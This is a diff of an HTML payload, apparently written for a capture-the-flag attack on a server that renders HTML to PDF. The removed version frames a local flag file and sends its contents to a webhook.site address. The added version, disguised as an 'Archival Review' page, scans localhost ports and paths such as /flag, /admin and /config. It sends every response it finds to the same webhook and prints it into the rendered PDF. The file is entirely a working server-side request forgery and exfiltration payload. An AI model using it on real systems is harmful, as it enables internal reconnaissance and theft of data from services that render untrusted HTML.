@@ -1,22 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PDF Exploit</title>
+    <title>Internal Network Scanner</title>
 </head>
 <body>
-    <iframe id="target" src="file:///app/flag.txt" width="600" height="400"></iframe>
+    <h1>Archival Review in Progress...</h1>
+    <div id="output" style="word-break: break-all; font-family: monospace;"></div>
+
     <script>
-        setTimeout(() => {
-            try {
-                // Try to read iframe content and exfiltrate
-                const iframeContent = document.getElementById('target').contentWindow.document.body.innerText;
-                fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?data=' + encodeURIComponent(iframeContent));
-            } catch (e) {
-                // Even if JS can't read it directly due to isolation, 
-                // if it renders in the DOM, it will be captured in the final PDF snapshot!
-                fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?error=' + encodeURIComponent(e.message));
-            }
-        }, 2000);
+        // Common ports where internal apps/APIs run in CTFs
+        const ports = [3000, 5000, 8080, 80, 443, 31326, 1337, 8000];
+        // Common sensitive paths
+        const paths = ['', '/flag', '/flag.txt', '/admin', '/api', '/debug', '/config', '/status'];
+
+        ports.forEach(port => {
+            paths.forEach(path => {
+                const target = `http://127.0.0.1:${port}${path}`;
+                
+                fetch(target)
+                    .then(response => response.text())
+                    .then(data => {
+                        if (data && data.length > 0) {
+                            // 1. Exfiltrate to your Webhook
+                            fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?target=' + encodeURIComponent(target) + '&data=' + encodeURIComponent(data));
+                            
+                            // 2. Render onto the page so it appears in the downloaded PDF
+                            document.getElementById('output').innerHTML += `<br>[FOUND] ${target}: <br>${data.replace(/</g, "&lt;")} <hr>`;
+                        }
+                    })
+                    .catch(error => {
+                        // Silently ignore closed ports/connection failures
+                    });
+            });
+        });
     </script>
 </body>
 </html>
